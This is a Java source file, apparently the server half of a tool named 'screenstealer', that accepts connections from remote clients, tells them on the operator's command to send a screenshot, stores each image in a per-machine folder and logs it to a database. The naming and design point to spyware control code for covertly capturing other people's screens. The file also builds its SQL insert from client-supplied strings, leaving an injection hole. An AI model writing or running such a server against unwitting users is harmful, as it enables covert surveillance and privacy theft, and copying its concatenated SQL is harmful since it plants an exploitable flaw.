package screenstealerserver;

import java.io.BufferedReader;
import java.io.DataInputStream;
import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.sql.SQLException;
import java.sql.Statement;

public class ClientThread extends Thread {

    private final Socket sock;
    private final Statement stat;
    private PrintWriter pw;
    private final BufferedReader input;
    private FileOutputStream fos;
    private DataInputStream dis;

    public ClientThread(Socket sock, Statement stat) {
        this.sock = sock;
        this.stat = stat;
        this.pw = null;
        this.input = new BufferedReader(new InputStreamReader(System.in));
        this.fos = null;
        this.dis = null;
    }

    @Override
    public void run() {
        try {
            System.out.println("Connection from client " + sock.getInetAddress().toString());
            pw = new PrintWriter(sock.getOutputStream(), true);
            dis = new DataInputStream(sock.getInputStream());
            String serial = dis.readUTF();
            System.out.println("Received Serial: " + serial);
            File dir = new File(serial);
            dir.mkdirs();
            byte[] recv;
            String timestamp, hash;
            int size;
            boolean res;
            while (!pw.checkError()) {
                System.out.println("Insert 1 to take a screenshot, 0 to close connection");
                int answer = Integer.parseInt(input.readLine());
                if (answer == 0 && !pw.checkError()) {
                    pw.println("STOP");
                    break;
                } else if (answer == 1 && !pw.checkError()) {
                    pw.println("GO");
                    timestamp = dis.readUTF();
                    size = dis.readInt();
                    if (size > 0) {
                        recv = new byte[size];
                        dis.readFully(recv, 0, size);
                        fos = new FileOutputStream(serial + "\\" + timestamp + ".png");
                        fos.write(recv);
                        try {
                            fos.close();
                        } catch (IOException e) {
                            e.printStackTrace();
                        }
                        hash = dis.readUTF();
                        System.out.println("Screenshot received!");
                        System.out.println("Timestamp: " + timestamp);
                        System.out.println("File hash: " + hash);
                        synchronized (stat) {
                            stat.executeUpdate("INSERT INTO screenstealer(serial, timestamp, hash) VALUES ('" + serial + "', '" + timestamp + "', '" + hash + "');");
                        }
                    }
                }
            }
        } catch (IOException | NumberFormatException | SQLException e) {
            e.printStackTrace();
        } finally {
            System.out.println("Connection with " + sock.getInetAddress().toString() + " closed");
            try {
                if (pw != null) {
                    pw.close();
                }
                if (dis != null) {
                    dis.close();
                }
                if (sock != null) {
                    sock.close();
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
    }
}
